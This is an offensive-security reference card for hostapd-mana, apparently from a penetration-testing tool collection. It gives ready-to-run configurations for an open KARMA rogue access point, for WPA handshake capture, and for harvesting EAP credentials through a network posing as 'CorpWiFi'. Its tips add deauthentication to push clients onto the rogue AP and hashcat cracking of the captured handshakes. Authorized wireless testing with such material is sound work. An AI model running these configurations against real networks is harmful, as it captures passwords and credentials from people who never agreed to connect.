# hostapd-mana

- **Category**: Wireless / Rogue AP
- **Risk Level**: 🔴 Critical

---

## Description

hostapd-mana is a modified version of hostapd with MANA and KARMA attack capabilities. It responds to all client probe requests regardless of SSID, captures WPA handshakes, and harvests EAP credentials via a built-in RADIUS server. Configurable through a hostapd-style configuration file. The core component for building custom evil twin setups.

## Installation

```bash
sudo apt install hostapd-mana
```

## Parameter Reference

Configuration is via `hostapd-mana.conf`:

| Parameter | Description |
|-----------|-------------|
| `interface=<iface>` | Wireless interface |
| `ssid=<name>` | AP SSID |
| `channel=<ch>` | Operating channel |
| `hw_mode=<mode>` | Hardware mode (a/b/g) |
| `wpa=<n>` | WPA mode (0=open, 1=WPA, 2=WPA2) |
| `enable_mana=1` | Enable MANA attack |
| `mana_loud=1` | Respond to ALL probe requests |
| `mana_macacl=1` | Enable MAC-based filtering |
| `mana_wpaout=<file>` | Write captured WPA handshakes |
| `eap_server=1` | Enable built-in EAP server |
| `mana_wpe=1` | Enable WPE (Wireless Pwnage Edition) credential capture |
| `eap_user_file=<file>` | EAP user configuration file |
| `mana_credout=<file>` | Write captured EAP credentials |
| `mana_eapsuccess=1` | Send EAP success after capture |
| `-d` | Show more debug messages |
| `-B` | Run daemon in background |

## Common Commands

### Scenario 1: Open rogue AP with MANA

```bash
# Create configuration
cat > /tmp/mana-open.conf << 'EOF'
interface=wlan0
ssid=FreeWiFi
channel=6
hw_mode=g
enable_mana=1
mana_loud=1
EOF

# Start rogue AP
sudo hostapd-mana /tmp/mana-open.conf
```

### Scenario 2: WPA handshake capture

```bash
# Configuration for WPA handshake capture
cat > /tmp/mana-wpa.conf << 'EOF'
interface=wlan0
ssid=TargetNetwork
channel=6
hw_mode=g
wpa=2
wpa_passphrase=doesntmatter
wpa_key_mgmt=WPA-PSK
enable_mana=1
mana_wpaout=/tmp/mana_wpa.hccapx
EOF

sudo hostapd-mana /tmp/mana-wpa.conf
```

### Scenario 3: EAP credential capture

```bash
# Configuration for EAP credential harvesting
cat > /tmp/mana-eap.conf << 'EOF'
interface=wlan0
ssid=CorpWiFi
channel=6
hw_mode=g
wpa=2
wpa_key_mgmt=WPA-EAP
ieee8021x=1
eap_server=1
mana_wpe=1
eap_user_file=/etc/hostapd-mana/mana.eap_user
mana_credout=/tmp/mana_creds.txt
mana_eapsuccess=1
enable_mana=1
EOF

sudo hostapd-mana /tmp/mana-eap.conf
```

## Notes & Tips

1. Requires explicit authorization — captures credentials from any client that connects
2. Use `mana_loud=1` for KARMA-style attacks (respond to all probes); omit for targeted SSID only
3. Combine with `aireplay-ng` Deauth to force clients to reconnect to the rogue AP
4. Captured WPA handshakes in `mana_wpaout` are in `.hccapx` format; convert to modern `.22000` format with `hcxpcapngtool` and crack with `hashcat -m 22000` (mode 2500 is deprecated)
5. For automated evil twin with phishing, consider `eaphammer` or `wifiphisher`

---

## Official References

- [hostapd-mana (GitHub)](https://github.com/sensepost/hostapd-mana)
- [hostapd-mana — Kali Tools](https://www.kali.org/tools/hostapd-mana/)
